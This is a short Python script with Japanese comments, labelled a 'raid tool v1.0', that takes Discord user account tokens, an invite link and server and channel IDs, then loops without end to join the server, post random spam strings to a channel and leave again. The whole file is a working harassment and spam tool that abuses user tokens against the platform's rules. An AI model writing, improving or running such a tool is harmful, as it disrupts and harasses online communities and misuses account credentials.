#
# 依存関係のインストール
# sudo pip3 install requests
#
import requests
import random, sys, os

t0ken = ['自分のt0ken(botのt0kenはだめ)']

os.system("clear")
print("荒らしツールv1.0\n")
syoutai   = input(f'招待URL: ')
serverid  = input(f'サーバーID: ')
channelid = input(f'チャンネルID: ')
n         = input(f'Enter押して実行\n[*]')

def bot_inviter(link, token):
    inv = link.replace("https://discord.gg/","")
    apilink = "https://discordapp.com/api/v9/invites/"+inv
    headers = {
        'authorization': token,
    }
    r = requests.post(apilink, headers=headers)

def bot_leaver(token):
    headers = {
        'authorization': token,
    }
    apilink = "https://discord.com/api/v9/users/@me/guilds/"+serverid
    r = requests.delete(apilink, headers=headers)

def attack():
    numcount = 5
    fstring = ""
    for j in range(5):
        if random.randint(0, 1) == 1:
            x = random.randint(1, 26)
            x += 96
            fstring += (chr(x).upper())
        elif not numcount == 0:
            x = random.randint(0, 9)
            fstring += str(x)
            numcount -= 1

        if random.randint(0, 1) == 1:
            x = random.randint(1, 26)
            x += 96
            fstring += (chr(x).upper())
        elif not numcount == 0:
            x = random.randint(0, 9)
            fstring += str(x)
            numcount -= 1
    payload = {
        'content': fstring
    }
    t_ken = random.choice(t0ken)
    header = {
        'Authorization': t_ken
    }
    bot_inviter(syoutai, t_ken)
    r = requests.post("https://discord.com/api/v9/channels/"+channelid+"/messages",data=payload,headers=header)
    print(fstring+" send!")
    bot_leaver(t_ken)

while True:
    attack()
